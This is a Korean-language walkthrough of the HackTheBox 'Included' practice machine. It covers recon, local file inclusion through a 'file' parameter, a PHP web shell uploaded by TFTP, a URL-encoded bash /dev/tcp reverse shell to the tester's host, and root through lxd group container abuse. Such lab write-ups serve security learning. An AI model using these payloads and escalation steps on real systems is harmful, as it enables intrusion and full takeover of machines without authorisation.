# Included - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 80 -sC -sV -oA included -vv 10.129.10.249
```
<img width="1071" height="157" alt="image" src="https://github.com/user-attachments/assets/163b120b-77fd-4632-9bdb-a6e4956e42e8" />

- HTTP(80)

<br>

```bash
sudo nmap --top-ports 100 -sU 10.129.95.185
```
<img width="1071" height="85" alt="image" src="https://github.com/user-attachments/assets/5c3f0175-d3ae-4cf0-84c2-fe5ccae4dee8" />

- TFTP(69)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.129.95.185

curl -IL http://10.129.95.185
```
<img width="1103" height="425" alt="image" src="https://github.com/user-attachments/assets/5715b5ad-fe00-46a4-8fc5-929fb5406956" />

### LFI
- 서버에 접속했을 때 `file`파라미터를 통해서 렌더링이 된다는 것을 확인.
<img width="1100" height="419" alt="image" src="https://github.com/user-attachments/assets/d6d0a69c-62a4-4018-8201-742a13300e37" />

<br>
<br>

- `file`파라미터를 통해서 LFI가 되는지 확인하기 위해서 `/etc/passwd`를 넣어서 성공.
- 로그파일 혹은 히스토리 파일 등을 포함하여 다른 파일들을 확인하려했으나, 접근 불가능.
```
http://10.129.95.185/?file=/etc/passwd
```
<img width="1100" height="121" alt="image" src="https://github.com/user-attachments/assets/b14c9407-9ae1-4732-b226-985ec214cc7a" />

### TFTP
- configuration file 위치를 구글로 검색해보니 `/etc/default/tftpd-hpa`로 확인되어 LFI를 시도.
<img width="1100" height="49" alt="image" src="https://github.com/user-attachments/assets/737077fb-23df-4dfa-bacb-6297c04fc2cb" />

<br>
<br>

- `/var/lib/tftpboot`에 파일이 업로드 되는지 시도.
<img width="1100" height="462" alt="image" src="https://github.com/user-attachments/assets/364a2bf9-6d04-4887-8df3-207acfb3825c" />

<br>
<br>

- 업로드 성공.
```
http://10.129.95.185/?file=/var/lib/tftpboot/ex.php&cmd=whoami
```
<img width="628" height="81" alt="image" src="https://github.com/user-attachments/assets/aed4606e-86cd-4654-8c52-05535a813d5c" />

<br>
<br>

- 리버스 셸 연결 시도.
```
http://10.129.95.185/?file=/var/lib/tftpboot/ex.php&cmd=bash%20-c%20'bash%20-i%20%3e%26%2fdev%2ftcp%2f10.10.14.240%2f80%200%3e%261'
```
<img width="773" height="261" alt="image" src="https://github.com/user-attachments/assets/8f563da2-60ae-41fb-89d6-3705c8941f69" />

<br>
<br>

- 셸 획득.
<img width="784" height="178" alt="image" src="https://github.com/user-attachments/assets/27c173ea-48f2-4c43-b46a-00b54e2dcb1d" />

---
## Privesc
- `.htpasswd`파일에서 `mike`로그인 계정 발견.
<img width="784" height="42" alt="image" src="https://github.com/user-attachments/assets/a0bc1e85-1312-4688-b244-306a01616ce3" />

<br>
<br>

- `mike`로 로그인
```bash
su - mike
```
<img width="784" height="78" alt="image" src="https://github.com/user-attachments/assets/d02d9832-2c07-4be4-a224-b74a987cba0f" />

<br>
<br>

- `mike`가 `lxd`그룹에 속해있는 것을 확인.
<img width="784" height="42" alt="image" src="https://github.com/user-attachments/assets/bfc00715-f1d9-49e2-830b-d1727ae69314" />

<br>
<br>

- https://amanisher.medium.com/lxd-privilege-escalation-in-linux-lxd-group-ec7cafe7af63
- 해당 링크의 순서대로 권한 상승 시도.
```bash
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```
<img width="975" height="42" alt="image" src="https://github.com/user-attachments/assets/4cfadcd5-7b11-4750-b0f0-be75d28b365b" />

<br>
<br>

```bash
lxc image list
```
<img width="1105" height="211" alt="image" src="https://github.com/user-attachments/assets/b7243722-faf5-4997-96a5-ec8797cb53d5" />

<br>
<br>

```bash
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```
<img width="1105" height="155" alt="image" src="https://github.com/user-attachments/assets/e4381b71-2a8e-44e3-938f-ec5cb7a28981" />

<br>
<br>

```bash
cd /mnt/root

ls -al
```
<img width="1105" height="589" alt="image" src="https://github.com/user-attachments/assets/039dae33-cb44-4de5-93a1-f5f1fdf27c97" />

---
## FLAG
- `/home/mike/user.txt`
<img width="1105" height="268" alt="image" src="https://github.com/user-attachments/assets/a8af30ac-bc29-4d2b-943a-c0a9b8da92f3" />

<br>
<br>

- `/root/root.txt`
<img width="1105" height="249" alt="image" src="https://github.com/user-attachments/assets/7f65439c-5309-4978-babc-16e485c4f61a" />


















